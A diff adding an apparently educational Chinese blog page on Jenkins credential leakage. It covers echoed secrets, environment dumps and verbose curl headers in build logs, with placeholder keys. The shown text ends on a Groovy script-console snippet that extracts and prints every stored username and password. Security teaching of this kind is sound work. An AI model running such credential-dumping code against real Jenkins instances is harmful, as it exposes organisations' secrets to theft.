@@ -1,0 +1,1923 @@
+<!DOCTYPE html><html lang="zh-CN"><head><!-- hexo injector head_begin start --><!-- Google tag (gtag.js) begins-->
+    <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-3DZR3TQYCY"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-3DZR3TQYCY');
+    </script>
+    <!-- Google tag (gtag.js) ends-->
+    <!-- hexo injector head_begin end -->
+    <meta charset="utf-8">
+    <!-- security headers starts -->
+    <!-- meta http-equiv="content-security-policy" content="script-src 'sha256-B5nfCL2Dym3Ba4YJFI7wB3f4vtClbrYJZ32A5erBEdg=' 'sha256-lJjk3/dvd+wXqRFjV7T5L/nXJXr5NjUjmsKSPEe+ass=';" -->
+    <!-- security headers ends -->
+    <!-- favicon starts -->    
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <!-- favicon ends -->
+    
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="alternate" href="/atom.xml" title="Decoding Digital Anomalies" type="application/atom+xml">
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    
+        
+
+
+    
+    
+        
+
+
+    
+
+
+
+    
+    <title>Jenkins 凭证泄露：CI/CD 流水线中隐藏的安全风险 | Decoding Digital Anomalies</title>
+    
+    <meta name="keywords" content="DevOps,Jenkins,Security">
+    
+    
+    <meta name="description" content="Jenkins 凭证可能通过构建日志、脚本控制台和 API 端点泄露。了解凭证如何被暴露，以及如何保护你的 CI/CD 流水线。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jenkins 凭证泄露：CI/CD 流水线中隐藏的安全风险">
+<meta property="og:url" content="https://neo01.com/zh-CN/2021/07/Jenkins-Credentials-Exposure/index.html">
+<meta property="og:site_name" content="Decoding Digital Anomalies">
+<meta property="og:description" content="Jenkins 凭证可能通过构建日志、脚本控制台和 API 端点泄露。了解凭证如何被暴露，以及如何保护你的 CI/CD 流水线。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://neo01.com/assets/jenkins/thumbnail.png">
+<meta property="article:published_time" content="2021-06-30T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-10-30T03:02:43.963Z">
+<meta property="article:author" content="Neo Alienson">
+<meta property="article:tag" content="DevOps">
+<meta property="article:tag" content="Jenkins">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://neo01.com/assets/jenkins/thumbnail.png">
+    
+    <!-- hexo injector head_end start --><link rel="stylesheet" type="text/css" href="/css/bundle.css"><script type="text/javascript" src="/js/bundle_first.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 8.1.0">  <link rel="canonical" href="https://neo01.com/zh-CN/2021/07/Jenkins-Credentials-Exposure/">
+  <link rel="alternate" hreflang="en" data-canonical="true" href="https://neo01.com/2021/07/Jenkins-Credentials-Exposure/">
+  <link rel="alternate" hreflang="zh-TW" href="https://neo01.com/zh-TW/2021/07/Jenkins-Credentials-Exposure/">
+  <link rel="alternate" hreflang="zh-CN" href="https://neo01.com/zh-CN/2021/07/Jenkins-Credentials-Exposure/">
+  <link rel="alternate" hreflang="ja" href="https://neo01.com/ja/2021/07/Jenkins-Credentials-Exposure/">
+<style id="admonition-styles">.admonition {
+  margin: 1em 0;
+  padding: 0rem;
+  border-left: 0.3rem solid;
+  border-radius: 0.4rem;
+  background-color: #f9f9f9;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.04);
+  overflow: hidden;
+  page-break-inside: avoid;
+}
+
+.admonition-title {
+  display: flex;
+  align-items: center;
+  font-weight: 600;
+  padding: 0rem 1rem 0.1rem 0.75rem;
+  font-size: 1.05em;
+  background-color: rgba(0, 0, 0, 0.03);
+  border-top-left-radius: 0.4rem;
+  border-top-right-radius: 0.4rem;
+  margin: 0 !important;
+}
+
+.admonition-icon {
+  font-size: 1.2em;
+  margin-right: 0.6rem;
+  opacity: 0.85;
+  margin-top: 0.1rem;
+}
+
+/* 内容区域 margin */
+.admonition > *:not(.admonition-title) {
+  margin: 0.6rem 1rem 0.6rem 1rem;
+}
+
+/* NOTE 类型 */
+.admonition.anote {
+  border-color: #448aff;
+}
+.admonition.anote > .admonition-title {
+  background-color: #448aff1a;
+  color: #2962ff;
+}
+
+/* INFO / TODO 类型 */
+.admonition.info,
+.admonition.todo {
+  border-color: #00b8d4;
+}
+.admonition.info > .admonition-title,
+.admonition.todo > .admonition-title {
+  background-color: rgba(0, 184, 212, 0.1);
+  color: #007c91;
+}
+
+/* 警告类 */
+.admonition.warning,
+.admonition.attention,
+.admonition.caution {
+  border-color: #ff9100;
+}
+.admonition.warning > .admonition-title,
+.admonition.attention > .admonition-title,
+.admonition.caution > .admonition-title {
+  background-color: rgba(255, 145, 0, 0.1);
+  color: #c66900;
+}
+
+/* 错误类 */
+.admonition.failure,
+.admonition.missing,
+.admonition.fail,
+.admonition.error,
+.admonition.danger,
+.admonition.bug {
+  border-color: #ff5252;
+}
+.admonition.failure > .admonition-title,
+.admonition.missing > .admonition-title,
+.admonition.fail > .admonition-title,
+.admonition.error > .admonition-title,
+.admonition.danger > .admonition-title,
+.admonition.bug > .admonition-title {
+  background-color: rgba(255, 82, 82, 0.1);
+  color: #b71c1c;
+}
+
+/* TIP 类型 */
+.admonition.tip {
+  border-color: #00bfa5;
+}
+.admonition.tip > .admonition-title {
+  background-color: #00bfa51a;
+  color: #00796b;
+}
+
+/* SUCCESS 类型 */
+.admonition.success {
+  border-color: #00c853;
+}
+.admonition.success > .admonition-title {
+  background-color: #00c8531a;
+  color: #2e7d32;
+}
+
+/* QUESTION 类型 */
+.admonition.question {
+  border-color: #64dd17;
+}
+.admonition.question > .admonition-title {
+  background-color: #64dd171a;
+  color: #558b2f;
+}
+
+/* EXAMPLE 类型 */
+.admonition.example {
+  border-color: #7c4dff;
+}
+.admonition.example > .admonition-title {
+  background-color: #7c4dff1a;
+  color: #512da8;
+}
+
+/* QUOTE 类型 */
+.admonition.quote {
+  border-color: #9e9e9e;
+}
+.admonition.quote > .admonition-title {
+  background-color: #9e9e9e1a;
+  color: #424242;
+}
+
+/*黑暗模式*/
+/* 夜间模式基础样式 */
+[data-theme="dark"] .admonition {
+  background-color: #1e1e1e;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.4);
+}
+
+[data-theme="dark"] .admonition-title {
+  background-color: rgba(255, 255, 255, 0.05);
+}
+
+/* anote */
+[data-theme="dark"] .admonition.anote {
+  border-color: #82b1ff;
+}
+[data-theme="dark"] .admonition.anote > .admonition-title {
+  background-color: #82b1ff1a;
+  color: #bbdefb;
+}
+
+/* tip */
+[data-theme="dark"] .admonition.tip {
+  border-color: #64ffda;
+}
+[data-theme="dark"] .admonition.tip > .admonition-title {
+  background-color: #64ffda1a;
+  color: #1de9b6;
+}
+
+/* success */
+[data-theme="dark"] .admonition.success {
+  border-color: #69f0ae;
+}
+[data-theme="dark"] .admonition.success > .admonition-title {
+  background-color: #69f0ae1a;
+  color: #00e676;
+}
+
+/* question */
+[data-theme="dark"] .admonition.question {
+  border-color: #b2ff59;
+}
+[data-theme="dark"] .admonition.question > .admonition-title {
+  background-color: #b2ff591a;
+  color: #aeea00;
+}
+
+/* example */
+[data-theme="dark"] .admonition.example {
+  border-color: #b388ff;
+}
+[data-theme="dark"] .admonition.example > .admonition-title {
+  background-color: #b388ff1a;
+  color: #b39ddb;
+}
+
+/* quote */
+[data-theme="dark"] .admonition.quote {
+  border-color: #bdbdbd;
+}
+[data-theme="dark"] .admonition.quote > .admonition-title {
+  background-color: #bdbdbd1a;
+  color: #eeeeee;
+}
+
+/* warning / attention / caution */
+[data-theme="dark"] .admonition.warning,
+[data-theme="dark"] .admonition.attention,
+[data-theme="dark"] .admonition.caution {
+  border-color: #ffb300;
+}
+[data-theme="dark"] .admonition.warning > .admonition-title,
+[data-theme="dark"] .admonition.attention > .admonition-title,
+[data-theme="dark"] .admonition.caution > .admonition-title {
+  background-color: #ffb3001a;
+  color: #ffe082;
+}
+
+/* error / fail / failure / bug / danger / missing */
+[data-theme="dark"] .admonition.error,
+[data-theme="dark"] .admonition.fail,
+[data-theme="dark"] .admonition.failure,
+[data-theme="dark"] .admonition.bug,
+[data-theme="dark"] .admonition.missing,
+[data-theme="dark"] .admonition.danger {
+  border-color: #ef5350;
+}
+[data-theme="dark"] .admonition.error > .admonition-title,
+[data-theme="dark"] .admonition.fail > .admonition-title,
+[data-theme="dark"] .admonition.failure > .admonition-title,
+[data-theme="dark"] .admonition.bug > .admonition-title,
+[data-theme="dark"] .admonition.missing > .admonition-title,
+[data-theme="dark"] .admonition.danger > .admonition-title {
+  background-color: #ef53501a;
+  color: #ff8a80;
+}</style></head>
+
+<body>
+    <div id="wrap">
+        
+        
+<header id="header">
+    <div id="header-outer" class="outer">
+        <div class="container">
+            <div class="container-inner">
+                <div id="header-title">
+                    <h1 class="logo-wrap">
+                        <div class="logo"></div>
+                    </h1>
+
+                        <h2 class="subtitle-wrap">
+                            <p class="title">解码数字异常</p>
+                          <p class="subtitle">有时功能就是数字兔子洞中的错误，反之亦然</p>
+                        </h2>
+
+
+
+
+                    <div id="lang-selector">
+                        <span class="lang-icon">🌐</span>
+                        
+                            <a href="#" class="lang-link" data-lang="en">English</a>
+<span class="lang-sep">|</span>                            <a href="#" class="lang-link" data-lang="zh-TW">繁體中文</a>
+<span class="lang-sep">|</span>                            <a href="#" class="lang-link" data-lang="ja">日本語</a>
+                        <script>
+                        document.addEventListener('DOMContentLoaded', function() {
+                            var currentLang = 'zh-CN';
+                            var currentPath = window.location.pathname;
+                            var basePath;
+                            
+                            if (currentLang === 'en') {
+                                basePath = currentPath;
+                            } else {
+                                basePath = currentPath.replace(new RegExp('^/' + currentLang + '/'), '/');
+                            }
+                            
+                            document.querySelectorAll('.lang-link').forEach(function(link) {
+                                var targetLang = link.getAttribute('data-lang');
+                                var targetPath;
+                                if (targetLang === 'en') {
+                                    targetPath = basePath;
+                                } else {
+                                    targetPath = '/' + targetLang + basePath;
+                                }
+                                link.href = targetPath;
+                            });
+                        });
+                        </script>
+                    </div>
+
+
+                </div>
+                <div id="header-inner" class="nav-container">
+                    <a id="main-nav-toggle" class="nav-icon fa fa-bars"></a>
+                    <div class="nav-container-inner">
+                        <ul id="main-nav">
+                            
+                                <li class="main-nav-list-item">
+                                    <a class="main-nav-list-link" href="/zh-CN/">主页</a>
+                                </li>
+                                                                    <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/zh-CN/categories/AI/">人工智能</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/zh-CN/categories/AI/Art-Gallery/">艺术画廊</a></li></ul></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/zh-CN/categories/Architecture/">架构</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/zh-CN/categories/Cybersecurity/">网络安全</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/zh-CN/categories/Development/">开发</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/zh-CN/categories/Misc/">杂项</a></li></ul>
+                                <li class="main-nav-list-item">
+                                    <a class="main-nav-list-link" href="/zh-CN/about-me">关于</a>
+                                </li>
+                            
+                        </ul>
+                        <nav id="sub-nav">
+                            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" id="search-form-input" placeholder="搜索">
+        <button type="submit" title="搜索" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" id="ins-search-input" placeholder="想要查找什么...">
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script integrity="sha256-B5nfCL2Dym3Ba4YJFI7wB3f4vtClbrYJZ32A5erBEdg=">
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+        LANG: 'zh-CN',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+
+
+
+</div>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+        
+        <div class="container">
+            <div class="main-body container-inner">
+                <div class="main-body-inner">
+                    <section id="main">
+                        <div class="main-body-header">
+    <h1 class="header">
+    
+    <a class="page-title-link" href="/categories/Development/">Development</a>
+    </h1>
+</div>
+
+                        <div class="main-body-content">
+                            <article id="post-2021/07/Jenkins-Credentials-Exposure-zh-CN" class="article article-single article-type-post" itemscope="" itemprop="blogPost">
+    <div class="article-inner responsive-content">
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+        Jenkins 凭证泄露：CI/CD 流水线中隐藏的安全风险
+        </h1>
+    
+
+            </header>
+        
+        
+            <div class="article-meta">
+                
+    <div class="article-date">
+      <i class="fa fa-calendar"></i>
+        
+          Created <time datetime="2021-06-30T16:00:00.000Z" itemprop="datePublished">2021-07-01</time>
+          &nbsp;<i class="fa fa-calendar"></i>
+          Updated <time datetime="2025-10-30T03:02:43.963Z" itemprop="datePublished">2025-10-30</time>
+        
+    </div>
+
+
+                
+
+                
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/zh-CN/tags/DevOps/">DevOps</a> <a class="tag-link" href="/zh-CN/tags/Security/">Security</a> <a class="tag-link" href="/zh-CN/tags/Jenkins/">Jenkins</a>
+    </div>
+
+            </div>
+        
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%90%86%E8%A7%A3-Jenkins-%E5%87%AD%E8%AF%81"><span class="toc-text">理解 Jenkins 凭证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E5%BB%BA%E6%97%A5%E5%BF%97%E6%B3%84%E9%9C%B2%EF%BC%9A%E6%9C%80%E5%B8%B8%E8%A7%81%E7%9A%84%E9%94%99%E8%AF%AF"><span class="toc-text">构建日志泄露：最常见的错误</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6%E5%8F%B0%EF%BC%9A%E7%AE%A1%E7%90%86%E5%90%8E%E9%97%A8"><span class="toc-text">脚本控制台：管理后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#API-%E6%B3%84%E9%9C%B2%EF%BC%9A%E7%A8%8B%E5%BA%8F%E5%8C%96%E8%AE%BF%E9%97%AE"><span class="toc-text">API 泄露：程序化访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%92%E4%BB%B6%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%EF%BC%9A%E7%AC%AC%E4%B8%89%E6%96%B9%E9%A3%8E%E9%99%A9"><span class="toc-text">插件生态系统：第三方风险</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%B3%84%E9%9C%B2%E6%83%85%E5%A2%83"><span class="toc-text">常见泄露情境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%9F%E5%AE%9E%E4%BA%8B%E4%BB%B6-%E5%BD%93%E7%BC%96%E7%A0%81%E7%9A%84%E5%87%AD%E8%AF%81%E5%B9%B6%E4%B8%8D%E5%AE%89%E5%85%A8"><span class="toc-text">真实事件:当编码的凭证并不安全</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4-Jenkins-%E5%87%AD%E8%AF%81"><span class="toc-text">保护 Jenkins 凭证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E5%92%8C%E5%93%8D%E5%BA%94"><span class="toc-text">检测和响应</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AE%BA"><span class="toc-text">结论</span></a></li></ol>
+            <style>
+img.left-image {
+  float: left;
+  margin-right: 10px;
+  margin-top: 30px;
+  max-height: 80px;
+  width: auto;
+}
+</style>
+<p><a href="javascript:void(0);" class="image-wrapper"><img src="/assets/jenkins/icon.png" alt="" class="left-image"></a><br>
+Jenkins 已成为无数 CI/CD 流水线的骨干，在全球组织中协调构建、测试和部署。其灵活性和丰富的插件生态系统使其功能强大，但这种灵活性也创造了许多凭证泄露的途径。一个配置错误的流水线或粗心的脚本，就可能将数据库密码、API 密钥或云端凭证泄露给任何有权访问构建日志的人。</p>
+<p>本文探讨 Jenkins 凭证可能被暴露的各种方式，从明显的错误（如在构建日志中输出机密）到插件配置和 API 端点中的细微漏洞。我们将揭示 Jenkins 部署中的隐藏风险，以及保护 CI/CD 基础设施中敏感凭证的实用策略。</p>
+<div class="admonition anote"><p class="admonition-title"><span class="mdi mdi-note-outline admonition-icon"></span>📝 适用于其他 CI/CD 系统</p><div class="admonition-content"><p>虽然本文专注于 Jenkins，但相同的凭证泄露风险也适用于其他 CI/CD 系统：</p>
+<p><strong>GitLab CI/CD</strong></p>
+<ul>
+<li>GitLab Runner 日志可能暴露机密</li>
+<li>CI/CD 变量可在任务日志中访问</li>
+<li>Artifact 和测试报告可能包含凭证</li>
+<li>API 端点暴露流水线配置</li>
+</ul>
+<p><strong>GitHub Actions</strong></p>
+<ul>
+<li>工作流日志暴露回显的机密</li>
+<li>Actions 可以访问并泄漏机密</li>
+<li>Artifact 可能包含嵌入的凭证</li>
+<li>调试模式增加暴露风险</li>
+</ul>
+<p><strong>一般原则</strong></p>
+<ul>
+<li>构建/任务日志是主要的暴露向量</li>
+<li>Artifact 和报告会持久化凭证</li>
+<li>API 访问暴露配置</li>
+<li>讨论的缓解策略普遍适用</li>
+</ul>
+</div></div>
+<h2 id="理解-Jenkins-凭证">理解 Jenkins 凭证</h2>
+<p>在深入探讨泄露风险之前，理解 Jenkins 如何管理凭证至关重要。Jenkins 提供集中式凭证存储，旨在保护机密安全，同时使流水线和任务能够访问它们。</p>
+<h3 id="Jenkins-凭证系统">Jenkins 凭证系统</h3>
+<p>Jenkins 凭证有多种类型，各自针对特定用途设计：</p>
+<div class="admonition anote"><p class="admonition-title"><span class="mdi mdi-note-outline admonition-icon"></span>🔑 Jenkins 凭证类型</p><div class="admonition-content"><p><strong>用户名与密码</strong></p>
+<ul>
+<li>基本身份验证凭证</li>
+<li>用于 Git 仓库、artifact 服务器、API</li>
+<li>以加密的键值对存储</li>
+<li>最常见的凭证类型</li>
+</ul>
+<p><strong>机密文本</strong></p>
+<ul>
+<li>单一机密值（API 密钥、令牌）</li>
+<li>用于云端供应商凭证、webhook 机密</li>
+<li>在 Jenkins 凭证存储中加密</li>
+<li>简单但多功能</li>
+</ul>
+<p><strong>机密文件</strong></p>
+<ul>
+<li>包含机密的完整文件（证书、kubeconfig）</li>
+<li>加密存储，在构建期间作为临时文件公开</li>
+<li>用于 SSH 密钥、TLS 证书、配置文件</li>
+</ul>
+<p><strong>SSH 用户名与私钥</strong></p>
+<ul>
+<li>用于 Git 和远程服务器的 SSH 身份验证</li>
+<li>私钥加密存储</li>
+<li>支持密码保护</li>
+</ul>
+<p><strong>证书</strong></p>
+<ul>
+<li>用于双向 TLS 的客户端证书</li>
+<li>PKCS#12 密钥存储</li>
+<li>用于安全的服务对服务通信</li>
+</ul>
+</div></div>
+<p>凭证存储使用存储在 <code>$JENKINS_HOME/secrets/master.key</code> 的主密钥加密机密。这种加密保护静态凭证，但一旦凭证在流水线中使用，它们就会通过各种渠道变得容易泄露。</p>
+<h3 id="凭证范围与访问控制">凭证范围与访问控制</h3>
+<p>Jenkins 凭证具有范围和访问控制，决定它们可以在哪里使用：</p>
+<div class="admonition tip"><p class="admonition-title"><span class="mdi mdi-lightbulb-on-outline admonition-icon"></span>🛡️ 凭证范围</p><div class="admonition-content"><p><strong>系统范围</strong></p>
+<ul>
+<li>仅供 Jenkins 系统使用（插件、配置）</li>
+<li>任务或流水线无法访问</li>
+<li>用于 Jenkins 对 Jenkins 通信、插件配置</li>
+</ul>
+<p><strong>全局范围</strong></p>
+<ul>
+<li>所有任务和流水线都可使用</li>
+<li>最常用的范围</li>
+<li>如果任务被入侵，泄露风险最高</li>
+</ul>
+<p><strong>文件夹范围（使用 Folders 插件）</strong></p>
+<ul>
+<li>凭证限定于特定文件夹</li>
+<li>限制暴露于任务子集</li>
+<li>比全局范围更好的隔离</li>
+</ul>
+<p><strong>访问控制</strong></p>
+<ul>
+<li>通过插件实现基于角色的访问控制（RBAC）</li>
+<li>凭证权限与任务权限分离</li>
+<li>用户可以使用凭证而无需查看它们</li>
+</ul>
+</div></div>
+<p>理解这些范围至关重要，因为许多凭证泄露发生在全局凭证被用于不需要如此广泛访问权限的任务时。</p>
+<h2 id="构建日志泄露：最常见的错误">构建日志泄露：最常见的错误</h2>
+<p>最常见的凭证泄露发生在构建日志中——Jenkins 存储并向用户显示的流水线执行详细输出。</p>
+<h3 id="意外的-Echo-和-Print-语句">意外的 Echo 和 Print 语句</h3>
+<p>开发人员经常通过打印变量值来调试流水线，却忘记凭证也只是变量：</p>
+<pre class="language-groovy" data-language="groovy"><code class="language-groovy"><span class="token comment">// 声明式流水线 - 危险</span>
+pipeline <span class="token punctuation">{</span>
+    agent any
+    environment <span class="token punctuation">{</span>
+        DB_PASSWORD <span class="token operator">=</span> <span class="token function">credentials</span><span class="token punctuation">(</span><span class="token string">'database-password'</span><span class="token punctuation">)</span>
+    <span class="token punctuation">}</span>
+    stages <span class="token punctuation">{</span>
+        <span class="token function">stage</span><span class="token punctuation">(</span><span class="token string">'Debug'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            steps <span class="token punctuation">{</span>
+                <span class="token comment">// 这会将密码打印到构建日志！</span>
+                sh <span class="token interpolation-string"><span class="token string">"echo Database password is: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token expression">DB_PASSWORD</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"</span></span>
+                
+                <span class="token comment">// 这也会暴露它</span>
+                echo <span class="token interpolation-string"><span class="token string">"Connecting with password: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token expression">DB_PASSWORD</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"</span></span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p>构建日志将包含：</p>
+<pre class="language-none"><code class="language-none">[Pipeline] sh
++ echo Database password is: SuperSecret123!
+Database password is: SuperSecret123!
+[Pipeline] echo
+Connecting with password: SuperSecret123!</code></pre>
+<p>任何有权访问构建日志的人——通常包括所有开发人员——现在都可以看到密码。</p>
+<h3 id="环境变量转储">环境变量转储</h3>
+<p>另一个常见错误是为了调试而转储所有环境变量：</p>
+<pre class="language-groovy" data-language="groovy"><code class="language-groovy">pipeline <span class="token punctuation">{</span>
+    agent any
+    environment <span class="token punctuation">{</span>
+        AWS_ACCESS_KEY <span class="token operator">=</span> <span class="token function">credentials</span><span class="token punctuation">(</span><span class="token string">'aws-access-key'</span><span class="token punctuation">)</span>
+        AWS_SECRET_KEY <span class="token operator">=</span> <span class="token function">credentials</span><span class="token punctuation">(</span><span class="token string">'aws-secret-key'</span><span class="token punctuation">)</span>
+    <span class="token punctuation">}</span>
+    stages <span class="token punctuation">{</span>
+        <span class="token function">stage</span><span class="token punctuation">(</span><span class="token string">'Debug Environment'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            steps <span class="token punctuation">{</span>
+                <span class="token comment">// 暴露所有环境变量，包括凭证</span>
+                sh <span class="token string">'env'</span>
+                
+                <span class="token comment">// 同样危险</span>
+                sh <span class="token string">'printenv'</span>
+                
+                <span class="token comment">// 这也可能泄漏凭证</span>
+                sh <span class="token string">'set'</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p>输出会揭示加载到环境中的所有凭证：</p>
+<pre class="language-none"><code class="language-none">AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
+AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY</code></pre>
+<h3 id="详细命令输出">详细命令输出</h3>
+<p>某些命令会产生包含凭证的详细输出：</p>
+<pre class="language-groovy" data-language="groovy"><code class="language-groovy">pipeline <span class="token punctuation">{</span>
+    agent any
+    stages <span class="token punctuation">{</span>
+        <span class="token function">stage</span><span class="token punctuation">(</span><span class="token string">'Deploy'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            steps <span class="token punctuation">{</span>
+                <span class="token function">withCredentials</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">usernamePassword</span><span class="token punctuation">(</span>
+                    credentialsId<span class="token punctuation">:</span> <span class="token string">'api-credentials'</span><span class="token punctuation">,</span>
+                    usernameVariable<span class="token punctuation">:</span> <span class="token string">'API_USER'</span><span class="token punctuation">,</span>
+                    passwordVariable<span class="token punctuation">:</span> <span class="token string">'API_PASS'</span>
+                <span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token comment">// curl 的 -v 标志会在标头中暴露凭证</span>
+                    sh <span class="token string">'curl -v -u ${API_USER}:${API_PASS} https://api.example.com/deploy'</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p>详细输出包含带有凭证的 Authorization 标头：</p>
+<pre class="language-none"><code class="language-none">&gt; GET /deploy HTTP/1.1
+&gt; Authorization: Basic QVBJVVNFUjpBUElQQVNT
+&gt; User-Agent: curl/7.68.0</code></pre>
+<p>虽然是 base64 编码，但这很容易解码以揭示用户名和密码。</p>
+<div class="admonition warning"><p class="admonition-title"><span class="mdi mdi-alert-outline admonition-icon"></span>⚠️ 构建日志泄露风险</p><div class="admonition-content"><p><strong>谁可以访问构建日志</strong></p>
+<ul>
+<li>所有具有任务读取权限的用户</li>
+<li>通常包括整个开发团队</li>
+<li>默认情况下日志无限期存储</li>
+<li>可通过 Web UI 和 API 访问</li>
+</ul>
+<p><strong>泄露的持久性</strong></p>
+<ul>
+<li>日志存储在 <code>$JENKINS_HOME/jobs/*/builds/*/log</code></li>
+<li>即使在凭证轮换后仍可访问</li>
+<li>包含在 Jenkins 备份中</li>
+<li>可能被转发到日志聚合系统</li>
+</ul>
+<p><strong>影响范围</strong></p>
+<ul>
+<li>暴露的凭证可以访问生产系统</li>
+<li>可能授予超出 Jenkins 环境的访问权限</li>
+<li>事后难以检测泄露</li>
+<li>所有暴露的凭证都需要轮换</li>
+</ul>
+</div></div>
+<h2 id="脚本控制台：管理后门">脚本控制台：管理后门</h2>
+<p>Jenkins 提供 Groovy 脚本控制台用于管理任务，但这个强大功能可能被利用来提取凭证。</p>
+<h3 id="直接凭证访问">直接凭证访问</h3>
+<p>具有脚本控制台访问权限的用户可以直接查询凭证存储：</p>
+<pre class="language-groovy" data-language="groovy"><code class="language-groovy"><span class="token comment">// 脚本控制台 - 提取所有凭证</span>
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>cloudbees<span class="token punctuation">.</span>plugins<span class="token punctuation">.</span>credentials<span class="token punctuation">.</span>*
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>cloudbees<span class="token punctuation">.</span>plugins<span class="token punctuation">.</span>credentials<span class="token punctuation">.</span>domains<span class="token punctuation">.</span>*
+
+<span class="token keyword">def</span> creds <span class="token operator">=</span> CredentialsProvider<span class="token punctuation">.</span><span class="token function">lookupCredentials</span><span class="token punctuation">(</span>
+    StandardUsernamePasswordCredentials<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>
+    Jenkins<span class="token punctuation">.</span>instance<span class="token punctuation">,</span>
+    null<span class="token punctuation">,</span>
+    null
+<span class="token punctuation">)</span>
+
+creds<span class="token punctuation">.</span>each <span class="token punctuation">{</span> c <span class="token operator">-&gt;</span>
+    println <span class="token interpolation-string"><span class="token string">"ID: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token expression">c<span class="token punctuation">.</span>id</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"</span></span>
+    println <span class="token interpolation-string"><span class="token string">"Username: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token expression">c<span class="token punctuation">.</span>username</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"</span></span>
+    println <span class="token interpolation-string"><span class="token string">"Password: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token expression">c<span class="token punctuation">.</span>password</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"</span></span>
+    println <span class="token interpolation-string"><span class="token string">"---"</span></span>
+<span class="token punctuation">}</span></code></pre>
